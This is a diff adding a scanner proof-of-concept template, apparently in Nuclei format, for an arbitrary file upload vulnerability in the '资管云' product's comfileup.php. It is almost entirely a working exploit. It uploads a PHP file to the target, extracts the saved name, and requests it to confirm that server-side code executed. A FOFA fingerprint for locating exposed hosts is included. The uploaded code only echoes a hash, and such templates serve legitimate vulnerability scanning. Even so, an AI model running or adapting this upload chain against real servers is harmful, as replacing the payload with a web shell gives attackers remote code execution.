@@ -1,0 +1,55 @@
+id: poc-yaml-zi-guan-yun-comfileup-php-anyfile-upload
+info:
+  name: 资管云 comfileup.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    finger: 资管云
+    fofa: icon_hash="-642591392"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  dt_1: "{{date_time('2006')}}"
+  dt_2: "{{date_time('01')}}"
+  dt_3: "{{date_time('02')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: file-upload-check
+    method: POST
+    path:
+      - "{{BaseURL}}/comfileup.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=--------1110146050
+    body: |-
+      ----------1110146050
+      Content-Disposition: form-data; name="file";filename="{{t1}}.php"
+
+      <?php echo md5({{t1}});?>
+      ----------1110146050--
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: file
+        regex:
+          - "-(?P<file>[0-9a-z]+).php"
+        internal: true
+
+  - id: file-verification-check
+    method: GET
+    path:
+      - "{{BaseURL}}/uploads/{{dt_1}}{{dt_2}}/{{dt_2}}{{dt_3}}/{{dt_1}}{{dt_2}}{{dt_3}}-{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
